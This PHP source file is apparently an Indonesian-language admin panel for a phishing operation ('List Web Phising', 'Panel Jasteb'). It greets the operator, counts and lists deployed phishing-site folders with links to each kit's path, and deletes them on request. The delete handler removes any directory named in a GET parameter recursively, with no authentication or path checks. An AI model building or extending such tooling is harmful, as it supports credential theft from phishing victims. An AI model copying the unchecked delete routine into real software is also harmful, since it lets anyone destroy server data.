<?php
$userName = "Dafzx 125"; // Mengganti Nama Selamat Datang

$directories = ['files','']; // Daftar List Web Phising
$folderLists = array_fill_keys($directories, []);

function deleteDirectory($dir) {
    if (!is_dir($dir)) return false;
    
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? deleteDirectory("$dir/$file") : unlink("$dir/$file");
    }
    
    return rmdir($dir);
}

if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['delete']) && isset($_GET['dir'])) {
    $dirToDelete = $_GET['dir'];
    if (deleteDirectory($dirToDelete)) {
        header("Location: {$_SERVER['PHP_SELF']}?deleted=true");
        exit();
    } else {
        echo "Gagal menghapus $dirToDelete.";
    }
}

foreach ($directories as $directory) {
    if (is_dir($directory)) {
        $folders = array_filter(glob($directory . '/*'), 'is_dir');
        $folderLists[$directory] = $folders;
    }
}

$totalWebsites = array_sum(array_map('count', $folderLists));

$deleted = isset($_GET['deleted']);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>List Web Phising</title>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
<style>
    body {
        font-family: 'Roboto', sans-serif;
        color: #333;
        margin: 0;
        padding: 0;
        background-image: url('https://itzpire.com/file/b858daf35401.jpg');
        background-size: cover;
        background-position: center;
    }
    .container {
        max-width: 1200px;
        margin: 50px auto;
        padding: 20px;
        background-color: rgba(255, 255, 255, 0.8);
        border: 1px solid #ddd;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .total-websites {
        margin-bottom: 20px;
        text-align: right;
        font-size: 14px;
        color: black;
    }
    .folder-column {
        margin-bottom: 30px;
        padding: 20px;
        background-color: #ffffff;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
        transition: box-shadow 0.3s ease;
        background: linear-gradient(to right, #ffcccc, #cc99ff);
    }
    .folder-column:hover {
        box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2);
    }
    .folder-column h3 {
        color: #333333;
        font-size: 18px;
        border-bottom: 1px solid #eeeeee;
        padding-bottom: 10px;
        background: linear-gradient(to right, #ffcccc, #cc99ff);
    }
    .folder-list {
        list-style: none;
        padding: 0;
        margin: 0;
    }
    .folder-list li {
        padding: 15px;
        background-color: #f9f9f9;
        border: 1px solid #e0e0e0;
        border-radius: 5px;
        margin-bottom: 10px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: all 0.3s ease;
    }
    .folder-list li:hover {
        background-color: #f3f3f3;
    }
    .folder-list a {
        color: #007bff;
        text-decoration: none;
        word-break: break-all;
    }
    .folder-list a:hover {
        text-decoration: underline;
    }
    .delete-btn {
        background-color: #dc3545;
        color: #ffffff;
        border: none;
        padding: 10px 20px;
        border-radius: 30px;
        cursor: pointer;
        font-size: 14px;
        transition: background-color 0.3s ease;
        text-transform: uppercase;
        box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
    }
    .delete-btn:hover {
        background-color: #c82333;
    }
    .welcome-message {
        margin-top: 20px;
        padding: 20px;
        background-color: rgba(212, 237, 218, 0.9);
        border: 1px solid #c3e6cb;
        border-radius: 5px;
        text-align: center;
    }
    .welcome-message p {
        font-size: 18px;
        color: #155724;
        margin-bottom: 0;
    }
</style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>List Panel Jasteb</h1>
        </div>
        <div class="total-websites">
            Jumlah Panel Jasteb : <?= $totalWebsites ?>
        </div>
        <div class="welcome-message">
            <?php if (isset($userName)): ?>
                <p>Selamat datang, <?= $userName ?>!</p>
            <?php endif; ?>
        </div>
        <div class="row">
            <?php foreach ($directories as $directory): ?>
                <div class="col-md-3 mb-4">
                    <div class="folder-column">
                        <h3><?= ucfirst($directory) ?></h3>
                        <ul class="folder-list">
                            <?php foreach ($folderLists[$directory] as $folder): ?>
                                <li>
                                    <a href="<?= $directory . '/' . basename($folder) ?>/dafzx" target="_blank"><?= $directory . '/' . basename($folder) ?></a>
                                    <button class="delete-btn" onclick="confirmDelete('<?php echo $folder; ?>')">Hapus</button>
                                </li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
    </div>
    
    <script>
        function confirmDelete(folder) {
            if (confirm(`Apakah Anda yakin ingin menghapus Web ini? ${folder}?`)) {
                window.location.href = `<?php echo $_SERVER['PHP_SELF']; ?>?delete=true&dir=${encodeURIComponent(folder)}`;
            }
        }
    </script>
</body>
</html>
